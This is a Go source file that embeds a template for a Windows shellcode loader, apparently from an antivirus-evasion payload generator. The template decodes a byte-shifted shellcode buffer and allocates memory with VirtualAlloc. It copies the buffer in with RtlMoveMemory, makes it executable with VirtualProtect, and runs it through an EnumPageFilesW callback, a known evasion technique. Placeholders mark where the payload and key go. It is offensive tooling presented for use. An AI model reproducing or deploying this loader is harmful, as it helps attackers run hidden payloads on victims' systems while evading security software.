package help

//Source Code
var GoCode = []byte(`package main

import (
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT = 0x1000
	MEM_RESERVE = 0x2000
	PAGE_EXECUTE_READ = 0x20
	PAGE_READWRITE = 0x04
)

<<ShellCode>>

func main() {
	kernel32 := syscall.NewLazyDLL("kernel32")
	psapi := syscall.NewLazyDLL("psapi.dll")
	EnumPageFilesW := psapi.NewProc("EnumPageFilesW")

	RtlMoveMemory := kernel32.NewProc("RtlMoveMemory")
	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
	VirtualProtect := kernel32.NewProc("VirtualProtect")

	for i := range buf {
		buf[i] -= <<N>>
	}
	addr, _, err := VirtualAlloc.Call(0, uintptr(len(buf)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	if err != syscall.Errno(0) {
		panic(err)
	}
	_, _, err =  RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&buf[0])), uintptr(len(buf)))
	if err != syscall.Errno(0) {
		panic(err)
	}

	OldProtect := PAGE_READWRITE
	_, _, err = VirtualProtect.Call(addr, uintptr(len(buf)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&OldProtect)))
	if err != syscall.Errno(0) {
		panic(err)
	}

	EnumPageFilesW.Call(addr,0)	
}
`)
